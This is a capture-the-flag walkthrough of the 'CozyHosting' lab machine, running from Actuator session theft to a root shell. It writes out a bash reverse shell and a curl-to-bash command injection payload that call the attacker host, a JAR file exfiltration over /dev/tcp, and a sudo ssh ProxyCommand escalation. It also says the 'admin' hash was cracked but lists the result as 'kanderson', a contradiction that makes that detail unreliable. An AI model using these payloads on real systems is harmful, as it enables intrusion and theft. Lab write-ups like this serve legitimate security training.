# CozyHosting
**Difficulty:** Easy | **OS:** Linux | **IP:** `10.129.231.240`

## Summary
**CozyHosting** is an easy-difficulty Linux machine running a Spring Boot web application. Initial access is achieved by discovering exposed Spring Boot Actuator endpoints, hijacking an active admin session via leaked JSESSIONID cookies, and leveraging a command injection flaw in an SSH host connection feature using `${IFS}` payload obfuscation. Lateral movement to user `josh` is accomplished by extracting PostgreSQL database credentials from a decompiled Spring Boot JAR file (`cloudhosting-0.0.1.jar`) and cracking the administrative bcrypt password hash. Privilege escalation to root is completed by abusing wildcard permissions on the `/usr/bin/ssh` binary via `sudo`.

## Reconnaissance

### Port Scanning (Nmap)
We begin by enumerating open TCP ports and active service versions:

- **22**: SSH (OpenSSH 8.9p1 Ubuntu 3ubuntu0.3)
- **80**: HTTP (nginx 1.18.0)

### Web Enumeration & Spring Boot Discovery
Directory brute-forcing on port 80 yields the following endpoints:

- `/index` — Main application page.
- `/login` — Authentication portal.
- `/admin` — Access restricted (401 `Unauthorized`).
- `/error` — Generates a Spring Boot Whitelabel Error Page.

The default Whitelabel Error message confirms a Spring Boot backend. Brute-forcing directory endpoints tailored for Spring Boot reveals exposed Actuator endpoints:

- `/actuator`
- `/actuator/env`
- `/actuator/mappings`
- `/actuator/sessions`

Accessing `/actuator/sessions` leaks active session cookies:

```
{
  "B566D802A318E79677B878C70F7C96A4": "kanderson"
}
```

## Exploitation (Initial Access)

### Session Hijacking & Command Injection

1) We intercept our web request to `/admin` and set the JSESSIONID cookie to `B566D802A318E79677B878C70F7C96A4`.
2) Reloading the page grants administrative dashboard access as `kanderson`.
3) At the bottom of the dashboard, an SSH connection utility allows setting target hostnames and usernames. Submitting standard injection primitives triggers verbose system command errors:

```
Input: test;whoami#
Output: ssh: Could not resolve hostname test: Temporary failure in name resolution /bin/bash: line 1: whoami
```

### Bypassing Sanitization & Reverse Shell
Spaces in the command payload are sanitized by the web application. We bypass space filtering using the internal bash field separator `${IFS}`:

1) We host a payload on our attacker host (`10.10.14.28`) containing a standard reverse shell:

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.28/443 0>&1
```

2) On the target web form, we inject a command sequence to fetch and pipe the payload to `bash`:

```
test;curl${IFS}10.10.14.28|bash;#
```
3) Executing the request triggers a reverse shell connection to our Netcat listener (`443`), granting access as the unprivileged web service user `app`.

## Pivoting / Lateral Movement

### Decompiling Application Archives & Database Extraction
Local system enumeration reveals the application source binary located at `/app/cloudhosting-0.0.1.jar`. We transfer the `.jar` archive to our local system for static analysis using Netcat:

- Attacker Host: `nc -nlvp 443 > cloudhosting-0.0.1.jar`
- Target Host: `cat cloudhosting-0.0.1.jar > /dev/tcp/10.10.14.28/443`
- Decompiling the archive using JD-GUI and inspecting `application.properties` uncovers local PostgreSQL database credentials:

```
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

### Database Dumping & Password Cracking
We connect locally to PostgreSQL on the target machine using `psql`:

```psql -h localhost -U 'postgres' -W```

We list tables (`\dt`) inside the `cozyhosting` database and dump the `users` table:

```
kanderson	$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim	
admin	$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm	
```

We crack the `admin` hash using `hashcat` / `John the Ripper` with the rockyou.txt wordlist:

Cracked Credentials: `kanderson` : `manchesterunited`

System enumeration shows an interactive user named `josh`. Testing credential reuse against `josh` via SSH successfully authenticates us:

```ssh josh@10.129.231.240```

We capture `user.txt` from `/home/josh/user.txt`.

## Privilege Escalation (Root Flag)

### Sudo Permission Enumeration

Checking permitted `sudo` commands for `josh`:

```sudo -l```

Output:

```
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

### Abusing Sudo SSH Execution (GTFOBins)
Because sudo permits executing `/usr/bin/ssh` with arbitrary parameters (*), we leverage SSH's `-o ProxyCommand` configuration option to execute arbitrary system binaries with root privileges:

```sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x```

The inline proxy command spawns an interactive root shell:

```
id
# uid=0(root) gid=0(root) groups=0(root)
```

We achieve full `root` privilege escalation and capture `root.txt`.
